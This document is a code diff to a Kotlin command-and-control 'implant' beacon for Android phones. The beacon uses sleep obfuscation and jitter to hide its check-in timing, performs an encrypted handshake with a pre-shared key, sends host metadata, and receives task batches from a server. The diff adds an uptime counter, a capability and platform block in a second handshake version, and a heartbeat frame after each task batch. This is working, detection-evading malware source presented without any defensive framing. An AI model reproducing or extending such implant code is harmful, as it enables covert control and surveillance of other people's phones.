@@ -29,6 +29,9 @@ class Beacon(
     private var sleep = config.sleepSec.toLong()
     private var jitter = config.jitterPercent
 
+    /** When the implant started: the heartbeat carries the uptime. */
+    private val startedAt = System.currentTimeMillis()
+
     /** Sleep obfuscation: an occasional long nap hides the metronome. */
     private var sleepObfuscate = true
     private var failures = 0
@@ -110,6 +113,7 @@ class Beacon(
         /** Control frames (REKEY) tolerated before a TASK_BATCH. */
         // One REKEY plus up to four TASK_CANCEL frames may precede the batch.
         const val MAX_CONTROL_FRAMES = 8
+
     }
 
     private fun loop() {
@@ -219,6 +223,9 @@ class Beacon(
      * The metadata of the handshake: the host facts and where the peer
      * listener waits.
      */
+    /** How long the implant has been running, in seconds. */
+    private fun uptimeSeconds(): Long = (System.currentTimeMillis() - startedAt) / 1000
+
     private fun meta(): Upk.MapV {
         val meta = SysInfo.meta(config.version)
         val address = peerAddress
@@ -279,7 +286,7 @@ class Beacon(
             ephemeral.publicRaw, clientNonce, ts, suite,
         )
         val hello = Upk.map(
-            "v" to Upk.num(1),
+            "v" to Upk.num(Wire.HELLO_VERSION.toLong()),
             "role" to Upk.num(Crypto.ROLE_AGENT.toLong()),
             "id" to Upk.str(config.agentId),
             "pub" to Upk.bin(ephemeral.publicRaw),
@@ -288,6 +295,19 @@ class Beacon(
             "suite" to Upk.num(suite.toLong()),
             "auth" to Upk.bin(auth),
             "meta" to meta(),
+            // The capability list is a field of its own in the second
+            // version of the handshake: the server reads it before it
+            // looks at the metadata and refuses work the phone cannot do.
+            "caps" to Upk.Arr(TaskRunner.CAPABILITIES.map { Upk.str(it) }),
+            // The version of the implant and the module ABI it speaks.
+            "iver" to Upk.str(config.version),
+            "abi" to Upk.num(Wire.ABI_VERSION.toLong()),
+            // The platform details: the os, the architecture and the family.
+            "plat" to Upk.map(
+                "os" to Upk.str("android"),
+                "arch" to Upk.str(SysInfo.machine()),
+                "family" to Upk.str("android"),
+            ),
         )
         val boot = Session.fromBootstrap(config.psk, suite, isServer = false)
         val frame = boot.sealValue(Wire.MSG_HELLO, hello)
@@ -379,6 +399,22 @@ class Beacon(
         // which transport it speaks and in which order it may fall back.
         applyRoute(batchBody.field("route"))
         val tasks = batchBody.field("tasks")?.list() ?: emptyList()
+        // The heartbeat: the small frame that says "still here, this is
+        // what I am".  It is sent after the batch, because a frame that
+        // is sent between the check-in and the batch would be sealed with
+        // the old keys when the server has already switched.
+        ch.writeFrame(
+            sess.sealValue(
+                Wire.MSG_HEARTBEAT,
+                Upk.map(
+                    "v" to Upk.num(1),
+                    "iver" to Upk.str(config.version),
+                    "abi" to Upk.num(Wire.ABI_VERSION.toLong()),
+                    "busy" to Upk.num(tasks.size.toLong()),
+                    "up" to Upk.num(uptimeSeconds()),
+                ),
+            )
+        )
         for (task in tasks) {
             val id = task.field("id")?.text() ?: ""
             val kind = task.field("kind")?.text() ?: ""
